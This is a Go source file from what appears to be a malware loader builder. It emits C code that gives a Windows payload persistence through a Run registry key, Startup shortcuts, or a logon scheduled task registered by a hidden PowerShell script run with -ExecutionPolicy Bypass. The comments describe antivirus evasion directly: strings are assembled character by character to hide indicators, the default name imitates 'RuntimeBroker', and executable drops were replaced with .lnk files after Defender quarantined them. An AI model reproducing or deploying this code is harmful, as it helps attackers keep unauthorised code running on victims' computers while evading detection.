package loader

import (
	"strconv"
)

// windowsPersistC returns C helpers + persist() for MinGW DiskDLL/MemOverlay hosts.
// Live hosts previously omitted persistence (only unused windowsCSource had it).
// When persistence is off, emit a no-op so default wraps stay free of Run/schtask IOCs.
//
// startup_lnk / all write a Shell Link (.lnk) into Startup (E-IMZO style), not a
// full PE copy — Defender was quarantining Startup\*.exe drops as Wacatac/Conteban.
func windowsPersistC(opts Options) string {
	method := opts.Persistence
	if method == "" {
		method = PersistOff
	}
	if method == PersistOff {
		return `
static void persist(void) {}
`
	}
	pn := opts.PersistName
	if pn == "" {
		pn = "RuntimeBroker"
	}
	methodLit := strconv.Quote(method)
	nameLit := strconv.Quote(pn)

	needRun := method == "runkey_hkcu" || method == "all"
	needTask := method == "schtask_logon" || method == "all"
	needStartup := method == "startup_lnk" || method == "all"

	body := `
#include <shlobj.h>
#include <shobjidl.h>
#include <shlguid.h>
#include <objbase.h>

static const char persist_method[] = ` + methodLit + `;
static const wchar_t persist_name[] = L` + nameLit + `;

static int persist_method_is(const char *m) {
	return lstrcmpiA(persist_method, m) == 0;
}

static int persist_method_all(void) {
	return persist_method_is("all");
}

static int persist_is_admin(void) {
	BOOL ok = FALSE;
	PSID sid = NULL;
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
			DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid))
		return 0;
	CheckTokenMembership(NULL, sid, &ok);
	FreeSid(sid);
	return ok ? 1 : 0;
}
`

	if needRun {
		body += `
static void persist_run_key(HKEY root, const wchar_t *self) {
	HKEY h = NULL;
	wchar_t sub[64];
	/* Build path at runtime to avoid a contiguous UTF-16 IOC in the PE. */
	sub[0]=L'S'; sub[1]=L'o'; sub[2]=L'f'; sub[3]=L't'; sub[4]=L'w';
	sub[5]=L'a'; sub[6]=L'r'; sub[7]=L'e'; sub[8]=L'\\';
	sub[9]=L'M'; sub[10]=L'i'; sub[11]=L'c'; sub[12]=L'r'; sub[13]=L'o';
	sub[14]=L's'; sub[15]=L'o'; sub[16]=L'f'; sub[17]=L't'; sub[18]=L'\\';
	sub[19]=L'W'; sub[20]=L'i'; sub[21]=L'n'; sub[22]=L'd'; sub[23]=L'o';
	sub[24]=L'w'; sub[25]=L's'; sub[26]=L'\\';
	sub[27]=L'C'; sub[28]=L'u'; sub[29]=L'r'; sub[30]=L'r'; sub[31]=L'e';
	sub[32]=L'n'; sub[33]=L't'; sub[34]=L'V'; sub[35]=L'e'; sub[36]=L'r';
	sub[37]=L's'; sub[38]=L'i'; sub[39]=L'o'; sub[40]=L'n'; sub[41]=L'\\';
	sub[42]=L'R'; sub[43]=L'u'; sub[44]=L'n'; sub[45]=0;
	if (!self || !self[0]) return;
	if (RegCreateKeyExW(root, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL) != 0 || !h)
		return;
	RegSetValueExW(h, persist_name, 0, REG_SZ,
		(const BYTE *)self, (DWORD)((lstrlenW(self) + 1) * sizeof(wchar_t)));
	RegCloseKey(h);
}

static void persist_run(const wchar_t *self) {
	persist_run_key(HKEY_CURRENT_USER, self);
	if (persist_is_admin())
		persist_run_key(HKEY_LOCAL_MACHINE, self);
}
`
	}

	if needStartup {
		body += `
/* E-IMZO style: write a .lnk into Startup that points at the updater path.
   Do not CopyFile the PE into Startup — that was quarantined as Wacatac/Conteban. */
static void persist_link_into_dir(const wchar_t *self, const wchar_t *dir) {
	wchar_t dst[MAX_PATH], work[MAX_PATH];
	wchar_t *slash;
	HRESULT hr;
	IShellLinkW *sl = NULL;
	IPersistFile *pf = NULL;
	if (!self || !self[0] || !dir || !dir[0]) return;
	if (lstrlenW(dir) + 1 + lstrlenW(persist_name) + 4 >= MAX_PATH) return;
	lstrcpyW(dst, dir);
	lstrcatW(dst, L"\\");
	lstrcatW(dst, persist_name);
	lstrcatW(dst, L".lnk");

	lstrcpyW(work, self);
	slash = wcsrchr(work, L'\\');
	if (!slash) slash = wcsrchr(work, L'/');
	if (slash) *slash = 0;
	else work[0] = 0;

	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;
	hr = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
		&IID_IShellLinkW, (void **)&sl);
	if (FAILED(hr) || !sl) {
		CoUninitialize();
		return;
	}
	sl->lpVtbl->SetPath(sl, self);
	if (work[0]) sl->lpVtbl->SetWorkingDirectory(sl, work);
	sl->lpVtbl->SetShowCmd(sl, SW_SHOWMINNOACTIVE);
	hr = sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void **)&pf);
	if (SUCCEEDED(hr) && pf) {
		pf->lpVtbl->Save(pf, dst, TRUE);
		pf->lpVtbl->Release(pf);
	}
	sl->lpVtbl->Release(sl);
	CoUninitialize();
}

static void persist_startup(const wchar_t *self) {
	wchar_t dir[MAX_PATH];
	if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, dir) == S_OK)
		persist_link_into_dir(self, dir);
	if (persist_is_admin() &&
	    SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, SHGFP_TYPE_CURRENT, dir) == S_OK)
		persist_link_into_dir(self, dir);
}
`
	}

	if needTask {
		body += `
static void persist_task(const wchar_t *self) {
	wchar_t ps1[MAX_PATH], cmd[MAX_PATH * 2], exe[32];
	char narrow[16], line[1200], path_utf8[MAX_PATH * 3], name_utf8[128];
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HANDLE f;
	DWORD w, i, n;
	BOOL ok;
	if (!self || !self[0]) return;

	n = GetTempPathW(MAX_PATH, ps1);
	if (!n || n >= MAX_PATH) return;
	if (lstrlenW(ps1) + 32 >= MAX_PATH) return;
	lstrcatW(ps1, persist_name);
	lstrcatW(ps1, L".ps1");

	WideCharToMultiByte(CP_UTF8, 0, self, -1, path_utf8, (int)sizeof(path_utf8), NULL, NULL);
	WideCharToMultiByte(CP_UTF8, 0, persist_name, -1, name_utf8, (int)sizeof(name_utf8), NULL, NULL);
	wsprintfA(line,
		"$u=$env:USERNAME;"
		"$a=New-ScheduledTaskAction -Execute '%s';"
		"$t=New-ScheduledTaskTrigger -AtLogOn -User $u;"
		"$p=New-ScheduledTaskPrincipal -UserId $u -LogonType Interactive -RunLevel Limited;"
		"Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Principal $p -Force | Out-Null\r\n",
		path_utf8, name_utf8);

	f = CreateFileW(ps1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE) return;
	WriteFile(f, line, (DWORD)lstrlenA(line), &w, NULL);
	CloseHandle(f);

	narrow[0]='p';narrow[1]='o';narrow[2]='w';narrow[3]='e';narrow[4]='r';narrow[5]='s';
	narrow[6]='h';narrow[7]='e';narrow[8]='l';narrow[9]='l';narrow[10]='.';narrow[11]='e';
	narrow[12]='x';narrow[13]='e';narrow[14]=0;
	for (i = 0; narrow[i]; i++) exe[i] = (wchar_t)(unsigned char)narrow[i];
	exe[i] = 0;

	wsprintfW(cmd, L"%s -NoProfile -ExecutionPolicy Bypass -File \"%s\"", exe, ps1);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = 0;
	ok = CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (ok) {
		WaitForSingleObject(pi.hProcess, 60000);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	DeleteFileW(ps1);

	if (ok || !persist_is_admin()) return;
	narrow[0]='s';narrow[1]='c';narrow[2]='h';narrow[3]='t';narrow[4]='a';narrow[5]='s';
	narrow[6]='k';narrow[7]='s';narrow[8]='.';narrow[9]='e';narrow[10]='x';narrow[11]='e';narrow[12]=0;
	wsprintfW(cmd,
		L"C:\\\\Windows\\\\System32\\\\%S /create /tn %s /sc ONLOGON /tr \\\"%s\\\" /rl HIGHEST /f",
		narrow, persist_name, self);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = 0;
	if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, 30000);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}
`
	}

	body += `
static void persist(void) {
	wchar_t self[MAX_PATH];
	if (persist_method_is("off") || !persist_method[0]) return;
	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return;
`
	if needRun {
		body += "\tif (persist_method_is(\"runkey_hkcu\") || persist_method_all()) persist_run(self);\n"
	}
	if needTask {
		body += "\tif (persist_method_is(\"schtask_logon\") || persist_method_all()) persist_task(self);\n"
	}
	if needStartup {
		body += "\tif (persist_method_is(\"startup_lnk\") || persist_method_all()) persist_startup(self);\n"
	}
	body += "}\n"
	return body
}

func windowsPersistCallSite() string {
	return "\n\tpersist();\n"
}
